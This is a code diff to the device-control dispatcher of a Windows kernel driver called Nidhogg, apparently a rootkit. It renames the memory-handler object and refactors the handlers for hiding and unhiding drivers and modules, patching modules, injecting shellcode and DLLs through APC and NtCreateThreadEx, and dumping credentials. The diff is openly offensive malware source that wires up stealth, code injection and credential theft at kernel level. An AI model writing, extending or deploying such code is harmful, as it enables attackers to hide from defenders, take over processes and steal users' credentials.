@@ -715,7 +715,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggMemoryUtils->PatchModule(&patchedModule);
+		status = NidhoggMemoryHandler->PatchModule(&patchedModule);
 
 		if (NT_SUCCESS(status)) {
 			auto prevIrql = KeGetCurrentIrql();
@@ -759,7 +759,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggMemoryUtils->HideModule(&hiddenModule);
+		status = NidhoggMemoryHandler->HideModule(&hiddenModule);
 
 		if (NT_SUCCESS(status)) {
 			auto prevIrql = KeGetCurrentIrql();
@@ -774,7 +774,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_HIDE_UNHIDE_DRIVER:
 	{
-		HiddenDriverInformation hiddenDriver{};
+		wchar_t* driverName = nullptr;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
 		if (!IsValidSize(size, sizeof(HiddenDriverInformation))) {
@@ -783,10 +783,9 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 		auto data = static_cast<HiddenDriverInformation*>(Irp->AssociatedIrp.SystemBuffer);
-		hiddenDriver.Hide = data->Hide;
 		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);
 
-		MemoryAllocator<WCHAR*> driverNameAllocator(&hiddenDriver.DriverName, driverNameSize);
+		MemoryAllocator<WCHAR*> driverNameAllocator(&driverName, driverNameSize);
 		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);
 
 		if (!NT_SUCCESS(status)) {
@@ -794,30 +793,32 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (hiddenDriver.Hide) {
-			if (NidhoggMemoryUtils->GetHiddenDrivers() == MAX_HIDDEN_DRIVERS) {
-				Print(DRIVER_PREFIX "Too many items.\n");
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-
-			status = NidhoggMemoryUtils->HideDriver(&hiddenDriver);
+		if (data->Hide) {
+			status = NidhoggMemoryHandler->HideDriver(driverName);
 
 			if (NT_SUCCESS(status)) {
 				auto prevIrql = KeGetCurrentIrql();
-				KeLowerIrql(PASSIVE_LEVEL);
-				Print(DRIVER_PREFIX "Hid driver %ws.\n", hiddenDriver.DriverName);
-				KeRaiseIrql(prevIrql, &prevIrql);
+
+				if (prevIrql != PASSIVE_LEVEL)
+					KeLowerIrql(PASSIVE_LEVEL);
+				Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName);
+
+				if (prevIrql != PASSIVE_LEVEL)
+					KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
 		else {
-			status = NidhoggMemoryUtils->UnhideDriver(&hiddenDriver);
+			status = NidhoggMemoryHandler->UnhideDriver(driverName);
 
 			if (NT_SUCCESS(status)) {
 				auto prevIrql = KeGetCurrentIrql();
-				KeLowerIrql(PASSIVE_LEVEL);
-				Print(DRIVER_PREFIX "Restored driver %ws.\n", hiddenDriver.DriverName);
-				KeRaiseIrql(prevIrql, &prevIrql);
+
+				if (prevIrql != PASSIVE_LEVEL)
+					KeLowerIrql(PASSIVE_LEVEL);
+				Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName);
+
+				if (prevIrql != PASSIVE_LEVEL)
+					KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
 
@@ -883,24 +884,24 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		switch (shellcodeInfo.Type) {
-		case APCInjection: {
+		case InjectionType::APCInjection: {
 			if (!Features.ApcInjection) {
 				Print(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
+			status = NidhoggMemoryHandler->InjectShellcodeAPC(&shellcodeInfo);
 			break;
 		}
-		case NtCreateThreadExInjection: {
+		case InjectionType::NtCreateThreadExInjection: {
 			if (!Features.CreateThreadInjection) {
 				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
+			status = NidhoggMemoryHandler->InjectShellcodeThread(&shellcodeInfo);
 			break;
 		}
 		default:
@@ -946,24 +947,24 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		switch (dllInfo.Type) {
-		case APCInjection: {
+		case InjectionType::APCInjection: {
 			if (!Features.ApcInjection) {
 				Print(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
+			status = NidhoggMemoryHandler->InjectDllAPC(&dllInfo);
 			break;
 		}
-		case NtCreateThreadExInjection: {
+		case InjectionType::NtCreateThreadExInjection: {
 			if (!Features.CreateThreadInjection) {
 				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
+			status = NidhoggMemoryHandler->InjectDllThread(&dllInfo);
 			break;
 		}
 		default:
@@ -1148,31 +1149,30 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (!IsValidSize(size, sizeof(ULONG)) && !IsValidSize(size, sizeof(DesKeyInformation)) &&
-			!IsValidSize(size, sizeof(OutputCredentials))) {
+		if (!IsValidSize(size, sizeof(IoctlCredentials)) && !IsValidSize(size, sizeof(SIZE_T))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		if (size == sizeof(ULONG)) {
-			ULONG sizeToAlloc = 0;
-			auto data = static_cast<ULONG*>(Irp->AssociatedIrp.SystemBuffer);
-			status = NidhoggMemoryUtils->DumpCredentials(&sizeToAlloc);
+		if (size == sizeof(SIZE_T)) {
+			SIZE_T sizeToAlloc = 0;
+			auto data = static_cast<SIZE_T*>(Irp->AssociatedIrp.SystemBuffer);
+			status = NidhoggMemoryHandler->DumpCredentials(&sizeToAlloc);
 
 			if (NT_SUCCESS(status)) {
-				status = ProbeAddress(data, sizeof(ULONG), sizeof(ULONG), STATUS_INVALID_ADDRESS);
+				status = ProbeAddress(data, sizeof(SIZE_T), sizeof(SIZE_T), STATUS_INVALID_ADDRESS);
 
 				if (NT_SUCCESS(status))
 					*data = sizeToAlloc;
+				Print(DRIVER_PREFIX "Need %llu bytes to dump credentials.\n", sizeToAlloc);
 			}
 		}
-		else if (size == sizeof(OutputCredentials)) {
-			auto data = static_cast<OutputCredentials*>(Irp->AssociatedIrp.SystemBuffer);
-			status = NidhoggMemoryUtils->GetCredentials(data);
-		}
-		else {
-			auto data = static_cast<DesKeyInformation*>(Irp->AssociatedIrp.SystemBuffer);
-			status = NidhoggMemoryUtils->GetDesKey(data);
+		else if (size == sizeof(IoctlCredentials)) {
+			auto data = static_cast<IoctlCredentials*>(Irp->AssociatedIrp.SystemBuffer);
+			status = NidhoggMemoryHandler->GetCredentials(data);
+
+			if (NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Dumped credentials successfully.\n");
 		}
 
 		if (!NT_SUCCESS(status))
